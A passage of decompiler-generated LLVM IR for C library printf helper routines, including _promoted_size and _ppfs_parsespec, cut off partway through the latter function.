  uselistorder label %dec_label_pc_1505c, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_14fd8, { 1, 0 }
  uselistorder label %dec_label_pc_14fd0, { 1, 0 }
  uselistorder label %dec_label_pc_14fac, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_15128.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_15114

dec_label_pc_15114:                               ; preds = %dec_label_pc_15130, %entry
  %v0_15114 = phi i32 [ %v1_15114, %dec_label_pc_15130 ], [ ptrtoint (i32* @global_var_22020.1350 to i32), %entry ]
  %v1_15114 = add i32 %v0_15114, -2
  %v1_15118 = add i32 %v0_15114, -1
  %v2_15118 = inttoptr i32 %v1_15118 to i8*
  %v3_15118 = load i8, i8* %v2_15118, align 1
  %v4_15118 = zext i8 %v3_15118 to i32
  %v1_1511c = inttoptr i32 %v1_15114 to i8*
  %v2_1511c = load i8, i8* %v1_1511c, align 2
  %v3_1511c = zext i8 %v2_1511c to i32
  %v3_15120 = mul nuw i32 %v4_15118, 16777216
  %v4_15124 = sdiv i32 %v3_15120, 65536
  %v5_15124 = or i32 %v4_15124, %v3_1511c
  %v9_15128 = icmp eq i32 %v5_15124, %v1_15128.pre
  br i1 %v9_15128, label %dec_label_pc_15114.dec_label_pc_1513c_crit_edge, label %dec_label_pc_15130

dec_label_pc_15114.dec_label_pc_1513c_crit_edge:  ; preds = %dec_label_pc_15114
  br label %dec_label_pc_1513c

dec_label_pc_15130:                               ; preds = %dec_label_pc_15114
  %tmp = icmp ugt i32 %v1_15114, ptrtoint (i32* @global_var_22008.1352 to i32)
  br i1 %tmp, label %dec_label_pc_15114, label %dec_label_pc_1513c

dec_label_pc_1513c:                               ; preds = %dec_label_pc_15130, %dec_label_pc_15114.dec_label_pc_1513c_crit_edge
  %v2_15144.pre-phi = sub i32 %v1_15114, ptrtoint (i32* @global_var_22008.1352 to i32)
  store i32 ptrtoint (i32* @global_var_22020.1350 to i32), i32* @r2, align 4
  %v4_15148 = sdiv i32 %v2_15144.pre-phi, 2
  %v5_15148 = add i32 %v4_15148, ptrtoint (i32* @global_var_22020.1350 to i32)
  %v6_15148 = inttoptr i32 %v5_15148 to i8*
  %v7_15148 = load i8, i8* %v6_15148, align 1
  %v9_15148 = zext i8 %v7_15148 to i32
  ret i32 %v9_15148

; uselistorder directives
  uselistorder i32 %v1_15114, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15114, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_22020.1350 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1515c = load i32, i32* @r4, align 4
  store i32 %v3_1515c, i32* %stack_var_-32, align 4
  %v6_1515c = load i32, i32* @r5, align 4
  %v25_1515c = ptrtoint i32* %stack_var_-32 to i32
  %v1_15160 = add i32 %tmp, 16
  %v2_15160 = inttoptr i32 %v1_15160 to i32*
  %v3_15160 = load i32, i32* %v2_15160, align 4
  %v2_15164 = ptrtoint i32* %stack_var_-88 to i32
  %v1_15168 = and i32 %v3_15160, 128
  store i32 %v1_15168, i32* @r4, align 4
  %v2_15168 = icmp eq i32 %v1_15168, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_15188 = add i32 %tmp, 24
  %v2_15188 = inttoptr i32 %v1_15188 to i32*
  %v3_15188 = load i32, i32* %v2_15188, align 4
  store i32 %v3_15188, i32* %sb.global-to-local, align 4
  br i1 %v2_15168, label %bb, label %dec_label_pc_151a8

bb:                                               ; preds = %entry
  %v3_1518c = load i32, i32* %arg1, align 4
  br label %dec_label_pc_151f4

dec_label_pc_15198:                               ; preds = %dec_label_pc_15378
  %v0_15198 = load i32, i32* %r0.global-to-local, align 4
  %v0_153a8.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_153a0

dec_label_pc_151a0:                               ; preds = %dec_label_pc_153a4
  %v1_151a0 = add i32 %v0_153a8.pre, 1
  store i32 %v1_151a0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_153c0

dec_label_pc_151a8:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_151ac

dec_label_pc_151ac:                               ; preds = %dec_label_pc_151e0.dec_label_pc_151ac_crit_edge, %dec_label_pc_151a8
  %v1_151bc = phi i32 [ %v1_151d0, %dec_label_pc_151e0.dec_label_pc_151ac_crit_edge ], [ 0, %dec_label_pc_151a8 ]
  %v0_151ac = phi i32 [ %v0_151ac.pre, %dec_label_pc_151e0.dec_label_pc_151ac_crit_edge ], [ %tmp, %dec_label_pc_151a8 ]
  %v1_151ac = inttoptr i32 %v0_151ac to i32*
  %v2_151ac = load i32, i32* %v1_151ac, align 4
  %v4_151b0 = mul i32 %v1_151bc, 4
  %v5_151b0 = add i32 %v2_151ac, %v4_151b0
  store i32 %v5_151b0, i32* %r3.global-to-local, align 4
  %v1_151b4 = add i32 %v5_151b0, -4
  %v2_151b4 = inttoptr i32 %v1_151b4 to i32*
  %v3_151b4 = load i32, i32* %v2_151b4, align 4
  store i32 %v3_151b4, i32* %r1.global-to-local, align 4
  store i32 %v25_1515c, i32* %ip.global-to-local, align 4
  %v2_151bc = add i32 %v1_151bc, %v25_1515c
  store i32 %v2_151bc, i32* %r2.global-to-local, align 4
  %v1_151c0 = trunc i32 %v3_151b4 to i8
  %v3_151c0 = add i32 %v2_151bc, -56
  %v4_151c0 = inttoptr i32 %v3_151c0 to i8*
  store i8 %v1_151c0, i8* %v4_151c0, align 1
  %v0_151c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_151c4 = add i32 %v0_151c4, -56
  %v2_151c4 = inttoptr i32 %v1_151c4 to i8*
  %v3_151c4 = load i8, i8* %v2_151c4, align 1
  %v4_151c4 = zext i8 %v3_151c4 to i32
  store i32 %v4_151c4, i32* %r2.global-to-local, align 4
  %v0_151c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_151c8 = add i32 %v0_151c8, -4
  %v2_151c8 = inttoptr i32 %v1_151c8 to i32*
  %v3_151c8 = load i32, i32* %v2_151c8, align 4
  store i32 %v3_151c8, i32* %r3.global-to-local, align 4
  %v9_151cc = icmp eq i32 %v4_151c4, %v3_151c8
  %v0_151d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_151d0 = add i32 %v0_151d0, 1
  store i32 %v1_151d0, i32* %r0.global-to-local, align 4
  br i1 %v9_151cc, label %dec_label_pc_151d8, label %dec_label_pc_155f0

dec_label_pc_151d8:                               ; preds = %dec_label_pc_151ac
  %v2_151d8 = icmp eq i8 %v3_151c4, 0
  br i1 %v2_151d8, label %dec_label_pc_151e8, label %dec_label_pc_151e0

dec_label_pc_151e0:                               ; preds = %dec_label_pc_151d8
  %tmp166 = icmp ult i32 %v1_151d0, 32
  br i1 %tmp166, label %dec_label_pc_151e0.dec_label_pc_151ac_crit_edge, label %dec_label_pc_151e8

dec_label_pc_151e0.dec_label_pc_151ac_crit_edge:  ; preds = %dec_label_pc_151e0
  %v0_151ac.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_151ac

dec_label_pc_151e8:                               ; preds = %dec_label_pc_151e0, %dec_label_pc_151d8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_151f0 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_151f4

dec_label_pc_151f4:                               ; preds = %bb, %dec_label_pc_151e8
  %storemerge102 = phi i32 [ %v2_151f0, %dec_label_pc_151e8 ], [ %v3_1518c, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_15204

dec_label_pc_15200:                               ; preds = %.thread22, %dec_label_pc_15310
  %v0_15200 = phi i32 [ %v2_15388, %.thread22 ], [ %storemerge105, %dec_label_pc_15310 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_15310 ]
  store i32 %v0_15200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15204

dec_label_pc_15204:                               ; preds = %dec_label_pc_151f4, %dec_label_pc_15200
  %v1_15220 = phi i32 [ %storemerge102, %dec_label_pc_151f4 ], [ %v0_15200, %dec_label_pc_15200 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_151f4 ], [ %stack_var_-48.0, %dec_label_pc_15200 ]
  %v1_15204 = inttoptr i32 %v1_15220 to i8*
  %v2_15204 = load i8, i8* %v1_15204, align 1
  %v3_15204 = zext i8 %v2_15204 to i32
  store i32 %v3_15204, i32* %r3.global-to-local, align 4
  %v7_15208 = icmp eq i8 %v2_15204, 42
  br i1 %v7_15208, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_15204
  store i32 %v1_15220, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_15204
  %v1_15214 = load i32, i32* @lr, align 4
  %v4_15214 = mul i32 %v1_15214, -4
  %v5_15214 = add i32 %v4_15214, %v25_1515c
  store i32 %v5_15214, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_15220 = add i32 %v1_15220, 1
  store i32 %v2_15220, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_15228 = add i32 %v5_15214, -12
  %v4_15228 = inttoptr i32 %v3_15228 to i32*
  store i32 0, i32* %v4_15228, align 4
  %v0_1524c.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_1524c.pre = phi i32 [ %v0_1524c.pre.pre, %bb124 ], [ %v1_15220, %.thread9.thread ]
  %v2_15250.pre = load i32, i32* @global_var_2b254, align 4
  br label %.backedge

dec_label_pc_15230:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_15234 = load i32, i32* %r0.global-to-local, align 4
  %v7_15238 = icmp sgt i32 %v0_15234, 4094
  br i1 %v7_15238, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_15230
  %v1_1524014 = add i32 %v0_152c4, 1
  store i32 %v1_1524014, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_15230
  %v11_1523c = mul i32 %v0_15234, 10
  %v12_1523c = add i32 %v11_1523c, %v3_1524c
  store i32 %v12_1523c, i32* %r3.global-to-local, align 4
  %v1_15240 = add i32 %v0_152c4, 1
  store i32 %v1_15240, i32* %r6.global-to-local, align 4
  %v9_15244 = add i32 %v12_1523c, -48
  store i32 %v9_15244, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_152c4 = phi i32 [ %v0_1524c.pre, %.preheader ], [ %v1_15240, %bb126 ], [ %v1_1524014, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_2b254 to i32), i32* %r3.global-to-local, align 4
  %v1_1524c = inttoptr i32 %v0_152c4 to i8*
  %v2_1524c = load i8, i8* %v1_1524c, align 1
  %v3_1524c = zext i8 %v2_1524c to i32
  store i32 %v3_1524c, i32* %r2.global-to-local, align 4
  store i32 %v2_15250.pre, i32* %r3.global-to-local, align 4
  %v3_15254 = mul nuw nsw i32 %v3_1524c, 2
  %v4_15254 = add i32 %v3_15254, %v2_15250.pre
  %v5_15254 = inttoptr i32 %v4_15254 to i8*
  %v6_15254 = load i8, i8* %v5_15254, align 1
  %v8_15254 = zext i8 %v6_15254 to i32
  store i32 %v8_15254, i32* %r3.global-to-local, align 4
  %v1_15258 = and i32 %v8_15254, 8
  %v2_15258 = icmp eq i32 %v1_15258, 0
  br i1 %v2_15258, label %dec_label_pc_15260, label %dec_label_pc_15230

dec_label_pc_15260:                               ; preds = %.backedge
  %v0_15260 = load i32, i32* %r1.global-to-local, align 4
  %v1_15260 = add i32 %v0_15260, -1
  %v2_15260 = inttoptr i32 %v1_15260 to i8*
  %v3_15260 = load i8, i8* %v2_15260, align 1
  %v4_15260 = zext i8 %v3_15260 to i32
  store i32 %v4_15260, i32* %r3.global-to-local, align 4
  %v7_15264 = icmp eq i8 %v3_15260, 37
  br i1 %v7_15264, label %dec_label_pc_1526c, label %dec_label_pc_15328

dec_label_pc_1526c:                               ; preds = %dec_label_pc_15260
  %v7_1526c = icmp eq i8 %v2_1524c, 36
  %. = zext i1 %v7_1526c to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_15278 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_15278, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_1526c
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1526c, %bb130
  %v1_152d4 = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_1526c ]
  %v2_15280 = icmp eq i32 %v1_152d4, 0
  %v0_152b0 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_15280, label %dec_label_pc_152b0, label %dec_label_pc_15288

dec_label_pc_15288:                               ; preds = %thread-pre-split
  %v2_152b0 = icmp eq i32 %v0_152b0, 0
  %v1_1528c = add i32 %v0_152c4, 1
  store i32 %v1_1528c, i32* %r1.global-to-local, align 4
  br i1 %v2_152b0, label %dec_label_pc_155f0, label %dec_label_pc_15294

dec_label_pc_15294:                               ; preds = %dec_label_pc_15288
  %v2_15294 = sub i32 %v0_15278, %v0_152b0
  %v4_15294 = xor i32 %v0_152b0, %v0_15278
  %v5_15294 = xor i32 %v2_15294, %v0_15278
  %v6_15294 = and i32 %v5_15294, %v4_15294
  %v7_15294 = icmp slt i32 %v6_15294, 0
  %v8_15294 = icmp slt i32 %v2_15294, 0
  %v9_15294 = icmp eq i32 %v0_15278, %v0_152b0
  %v3_15298 = xor i1 %v8_15294, %v7_15294
  %v4_15298 = or i1 %v9_15294, %v3_15298
  br i1 %v4_15298, label %dec_label_pc_152a8, label %bb131

bb131:                                            ; preds = %dec_label_pc_15294
  store i32 %v0_15278, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_152a8

dec_label_pc_152a4:                               ; preds = %dec_label_pc_152c4, %dec_label_pc_152cc
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_152a8

dec_label_pc_152a8:                               ; preds = %bb131, %dec_label_pc_15294, %dec_label_pc_152a4
  %v0_152a8 = phi i32 [ %v0_15260, %dec_label_pc_152a4 ], [ %v1_1528c, %dec_label_pc_15294 ], [ %v1_1528c, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_152a4 ], [ %v0_15278, %dec_label_pc_15294 ], [ %v0_15278, %bb131 ]
  br label %dec_label_pc_152e0

dec_label_pc_152b0:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_152b0, 1
  br i1 %tmp132, label %dec_label_pc_152c4, label %dec_label_pc_152b8

dec_label_pc_152b8:                               ; preds = %dec_label_pc_152b0
  %v7_152b8 = icmp eq i8 %v2_1524c, 109
  br i1 %v7_152b8, label %dec_label_pc_15328, label %dec_label_pc_155f0

dec_label_pc_152c4:                               ; preds = %dec_label_pc_152b0
  %tmp167 = icmp ugt i32 %v0_152c4, %v0_15260
  br i1 %tmp167, label %dec_label_pc_152cc, label %dec_label_pc_152a4

dec_label_pc_152cc:                               ; preds = %dec_label_pc_152c4
  %v1_152cc = inttoptr i32 %v0_15260 to i8*
  %v2_152cc = load i8, i8* %v1_152cc, align 1
  %v3_152cc = zext i8 %v2_152cc to i32
  store i32 %v3_152cc, i32* %r3.global-to-local, align 4
  %v7_152d0 = icmp eq i8 %v2_152cc, 48
  br i1 %v7_152d0, label %dec_label_pc_152a4, label %bb133

bb133:                                            ; preds = %dec_label_pc_152cc
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15328

dec_label_pc_152e0.loopexit:                      ; preds = %dec_label_pc_152e8
  %v1_152f4 = load i32, i32* @r4, align 4
  %v3_152f4 = or i32 %v1_152f4, %v0_15308
  store i32 %v3_152f4, i32* @r4, align 4
  %v2_152f8 = add i32 %storemerge105, 1
  br label %dec_label_pc_152e0

dec_label_pc_152e0:                               ; preds = %dec_label_pc_152e0.loopexit, %dec_label_pc_152a8
  %storemerge105 = phi i32 [ %v0_152a8, %dec_label_pc_152a8 ], [ %v2_152f8, %dec_label_pc_152e0.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_22000.1357 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_152ec = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_152e8

dec_label_pc_152e8:                               ; preds = %dec_label_pc_15300, %dec_label_pc_152e0
  %v0_15308 = phi i32 [ %v2_15308, %dec_label_pc_15300 ], [ 1, %dec_label_pc_152e0 ]
  %v0_152e8 = phi i32 [ %v5_152e8, %dec_label_pc_15300 ], [ ptrtoint ([8 x i8]* @global_var_22000.1357 to i32), %dec_label_pc_152e0 ]
  %v1_152e8 = inttoptr i32 %v0_152e8 to i8*
  %v2_152e8 = load i8, i8* %v1_152e8, align 1
  %v3_152e8 = zext i8 %v2_152e8 to i32
  store i32 %v3_152e8, i32* %r2.global-to-local, align 4
  %v5_152e8 = add i32 %v0_152e8, 1
  store i32 %v5_152e8, i32* %r1.global-to-local, align 4
  %v2_152ec = load i8, i8* %v1_152ec, align 1
  %v3_152ec = zext i8 %v2_152ec to i32
  store i32 %v3_152ec, i32* %r3.global-to-local, align 4
  %v9_152f0 = icmp eq i8 %v2_152ec, %v2_152e8
  br i1 %v9_152f0, label %dec_label_pc_152e0.loopexit, label %dec_label_pc_15300

dec_label_pc_15300:                               ; preds = %dec_label_pc_152e8
  %v1_15300 = inttoptr i32 %v5_152e8 to i8*
  %v2_15300 = load i8, i8* %v1_15300, align 1
  %v3_15300 = zext i8 %v2_15300 to i32
  store i32 %v3_15300, i32* %r3.global-to-local, align 4
  %v2_15304 = icmp eq i8 %v2_15300, 0
  %v2_15308 = mul i32 %v0_15308, 2
  store i32 %v2_15308, i32* %r0.global-to-local, align 4
  br i1 %v2_15304, label %dec_label_pc_15310, label %dec_label_pc_152e8

dec_label_pc_15310:                               ; preds = %dec_label_pc_15300
  %v1_15310 = add i32 %storemerge105, -1
  %v2_15310 = inttoptr i32 %v1_15310 to i8*
  %v3_15310 = load i8, i8* %v2_15310, align 1
  %v7_15314 = icmp eq i8 %v3_15310, 37
  %v0_15318 = load i32, i32* @r4, align 4
  %v1_15318 = and i32 %v0_15318, 10
  store i32 %v1_15318, i32* %r3.global-to-local, align 4
  %v4_1531c = udiv i32 %v1_15318, 2
  %v5_1531c = sub nuw nsw i32 -1, %v4_1531c
  %v6_1531c = and i32 %v0_15318, %v5_1531c
  store i32 %v6_1531c, i32* @r4, align 4
  br i1 %v7_15314, label %dec_label_pc_15324, label %dec_label_pc_15200

dec_label_pc_15324:                               ; preds = %dec_label_pc_15310
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15328

dec_label_pc_15328:                               ; preds = %bb133, %dec_label_pc_15260, %dec_label_pc_152b8, %dec_label_pc_15324
  %v1_1536c = phi i32 [ %storemerge105, %dec_label_pc_15324 ], [ %v0_152c4, %bb133 ], [ %v0_152c4, %dec_label_pc_152b8 ], [ %v0_152c4, %dec_label_pc_15260 ]
  %v0_15368 = phi i32 [ %v5_152e8, %dec_label_pc_15324 ], [ %v0_15260, %bb133 ], [ %v0_15260, %dec_label_pc_152b8 ], [ %v0_15260, %dec_label_pc_15260 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_15324 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_152b8 ], [ %stack_var_-48.1, %dec_label_pc_15260 ]
  %v1_15328 = inttoptr i32 %v0_15368 to i8*
  %v2_15328 = load i8, i8* %v1_15328, align 1
  %v3_15328 = zext i8 %v2_15328 to i32
  store i32 %v3_15328, i32* %r3.global-to-local, align 4
  %v7_1532c = icmp eq i8 %v2_15328, 42
  br i1 %v7_1532c, label %dec_label_pc_15334, label %dec_label_pc_15378

dec_label_pc_15334:                               ; preds = %dec_label_pc_15328
  %v0_15334 = load i32, i32* %sb.global-to-local, align 4
  %v2_15334 = icmp eq i32 %v0_15334, 0
  br i1 %v2_15334, label %dec_label_pc_15368, label %dec_label_pc_1533c

dec_label_pc_1533c:                               ; preds = %dec_label_pc_15334
  %v1_1533c = inttoptr i32 %v1_1536c to i8*
  %v2_1533c = load i8, i8* %v1_1533c, align 1
  %v3_1533c = zext i8 %v2_1533c to i32
  store i32 %v3_1533c, i32* %r3.global-to-local, align 4
  %v7_15340 = icmp eq i8 %v2_1533c, 36
  br i1 %v7_15340, label %dec_label_pc_15348, label %dec_label_pc_155f0

dec_label_pc_15348:                               ; preds = %dec_label_pc_1533c
  %v0_15348 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_15348, 1
  br i1 %tmp134, label %dec_label_pc_155f0, label %dec_label_pc_15350

dec_label_pc_15350:                               ; preds = %dec_label_pc_15348
  store i32 %v25_1515c, i32* %r1.global-to-local, align 4
  %v0_15358 = load i32, i32* @lr, align 4
  %v3_15358 = mul i32 %v0_15358, -4
  %v4_15358 = add i32 %v3_15358, %v25_1515c
  store i32 %v4_15358, i32* %r3.global-to-local, align 4
  %v1_1535c = add i32 %v1_1536c, 1
  store i32 %v1_1535c, i32* %r6.global-to-local, align 4
  %v2_15360 = add i32 %v4_15358, -24
  %v3_15360 = inttoptr i32 %v2_15360 to i32*
  store i32 %v0_15348, i32* %v3_15360, align 4
  br label %dec_label_pc_15374

dec_label_pc_15368:                               ; preds = %dec_label_pc_15334
  %v1_15368 = add i32 %v0_15368, 1
  store i32 %v1_15368, i32* %r3.global-to-local, align 4
  %v9_1536c = icmp eq i32 %v1_15368, %v1_1536c
  br i1 %v9_1536c, label %dec_label_pc_15374, label %dec_label_pc_155f0

dec_label_pc_15374:                               ; preds = %dec_label_pc_15368, %dec_label_pc_15350
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15378

dec_label_pc_15378:                               ; preds = %dec_label_pc_15328, %dec_label_pc_15374
  %v0_15378 = load i32, i32* @lr, align 4
  %v2_15378 = icmp eq i32 %v0_15378, 0
  br i1 %v2_15378, label %dec_label_pc_15380, label %dec_label_pc_15198

dec_label_pc_15380:                               ; preds = %dec_label_pc_15378
  %v0_15380 = load i32, i32* %r6.global-to-local, align 4
  %v1_15380 = inttoptr i32 %v0_15380 to i8*
  %v2_15380 = load i8, i8* %v1_15380, align 1
  %v3_15380 = zext i8 %v2_15380 to i32
  store i32 %v3_15380, i32* %r3.global-to-local, align 4
  %v7_15384 = icmp eq i8 %v2_15380, 46
  br i1 %v7_15384, label %.thread22, label %dec_label_pc_15398

.thread22:                                        ; preds = %dec_label_pc_15380
  %v2_15388 = add i32 %v0_15380, 1
  store i32 %v2_15388, i32* %r6.global-to-local, align 4
  %v1_1538c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_1538c, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_15200

dec_label_pc_15398:                               ; preds = %dec_label_pc_15380
  %v0_15398 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15398, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_153a0

dec_label_pc_153a0:                               ; preds = %dec_label_pc_15198, %dec_label_pc_15398
  %v0_153a8.pre = phi i32 [ %v0_15380, %dec_label_pc_15398 ], [ %v0_153a8.pre.pre, %dec_label_pc_15198 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_15398 ], [ %v0_15198, %dec_label_pc_15198 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_21fa8.1359 to i32), i32* %r1.global-to-local, align 4
  %v1_153a8 = inttoptr i32 %v0_153a8.pre to i8*
  br label %dec_label_pc_153a4

dec_label_pc_153a4:                               ; preds = %dec_label_pc_153b4, %dec_label_pc_153a0
  %v0_153b4 = phi i32 [ %v1_153b4, %dec_label_pc_153b4 ], [ ptrtoint ([9 x i8]* @global_var_21fa8.1359 to i32), %dec_label_pc_153a0 ]
  %v1_153a4 = inttoptr i32 %v0_153b4 to i8*
  %v2_153a4 = load i8, i8* %v1_153a4, align 1
  %v3_153a4 = zext i8 %v2_153a4 to i32
  store i32 %v3_153a4, i32* %r2.global-to-local, align 4
  %v2_153a8 = load i8, i8* %v1_153a8, align 1
  %v3_153a8 = zext i8 %v2_153a8 to i32
  store i32 %v3_153a8, i32* %r3.global-to-local, align 4
  %v9_153ac = icmp eq i8 %v2_153a8, %v2_153a4
  br i1 %v9_153ac, label %dec_label_pc_151a0, label %dec_label_pc_153b4

dec_label_pc_153b4:                               ; preds = %dec_label_pc_153a4
  %v1_153b4 = add i32 %v0_153b4, 1
  %v2_153b4 = inttoptr i32 %v1_153b4 to i8*
  %v3_153b4 = load i8, i8* %v2_153b4, align 1
  %v4_153b4 = zext i8 %v3_153b4 to i32
  store i32 %v4_153b4, i32* %r3.global-to-local, align 4
  store i32 %v1_153b4, i32* %r1.global-to-local, align 4
  %v2_153b8 = icmp eq i8 %v3_153b4, 0
  br i1 %v2_153b8, label %dec_label_pc_153c0, label %dec_label_pc_153a4

dec_label_pc_153c0:                               ; preds = %dec_label_pc_153b4, %dec_label_pc_151a0
  %v1_153e0 = phi i32 [ %v1_151a0, %dec_label_pc_151a0 ], [ %v0_153a8.pre, %dec_label_pc_153b4 ]
  %v1_153dc = phi i32 [ %v0_153b4, %dec_label_pc_151a0 ], [ %v1_153b4, %dec_label_pc_153b4 ]
  %v2_153c4 = sub i32 %v1_153dc, ptrtoint ([9 x i8]* @global_var_21fa8.1359 to i32)
  store i32 %v2_153c4, i32* %r3.global-to-local, align 4
  %v8_153cc = icmp sgt i32 %v2_153c4, 1
  br i1 %v8_153cc, label %.thread25, label %dec_label_pc_153d0

dec_label_pc_153d0:                               ; preds = %dec_label_pc_153c0
  %v1_153d0 = inttoptr i32 %v1_153e0 to i8*
  %v2_153d0 = load i8, i8* %v1_153d0, align 1
  %v3_153d0 = zext i8 %v2_153d0 to i32
  store i32 %v3_153d0, i32* %r2.global-to-local, align 4
  %v1_153d4 = inttoptr i32 %v1_153dc to i8*
  %v2_153d4 = load i8, i8* %v1_153d4, align 1
  %v3_153d4 = zext i8 %v2_153d4 to i32
  store i32 %v3_153d4, i32* %r3.global-to-local, align 4
  %v9_153d8 = icmp eq i8 %v2_153d0, %v2_153d4
  br i1 %v9_153d8, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_153d0
  %v2_153dc = add i32 %v1_153dc, 9
  store i32 %v2_153dc, i32* %r1.global-to-local, align 4
  %v2_153e0 = add i32 %v1_153e0, 1
  store i32 %v2_153e0, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_153d0, %dec_label_pc_153c0, %bb135
  %v0_153e8 = phi i32 [ %v1_153dc, %dec_label_pc_153d0 ], [ %v1_153dc, %dec_label_pc_153c0 ], [ %v2_153dc, %bb135 ]
  %v0_153e4 = phi i32 [ %v1_153e0, %dec_label_pc_153d0 ], [ %v1_153e0, %dec_label_pc_153c0 ], [ %v2_153e0, %bb135 ]
  %v1_153e4 = inttoptr i32 %v0_153e4 to i8*
  %v2_153e4 = load i8, i8* %v1_153e4, align 1
  %v3_153e4 = zext i8 %v2_153e4 to i32
  store i32 %v3_153e4, i32* %r2.global-to-local, align 4
  %v1_153e8 = add i32 %v0_153e8, 9
  %v2_153e8 = inttoptr i32 %v1_153e8 to i8*
  %v3_153e8 = load i8, i8* %v2_153e8, align 1
  %v4_153e8 = zext i8 %v3_153e8 to i32
  store i32 %v4_153e8, i32* %r3.global-to-local, align 4
  %v2_153ec = icmp eq i8 %v2_153e4, 0
  %v3_153f0 = mul nuw nsw i32 %v4_153e8, 256
  store i32 %v3_153f0, i32* @lr, align 4
  br i1 %v2_153ec, label %dec_label_pc_155f0, label %dec_label_pc_153f8

dec_label_pc_153f8:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_21fe8.1361 to i32), i32* %ip.global-to-local, align 4
  %v3_153fc = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_153fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15400

dec_label_pc_15400:                               ; preds = %dec_label_pc_15484, %dec_label_pc_153f8
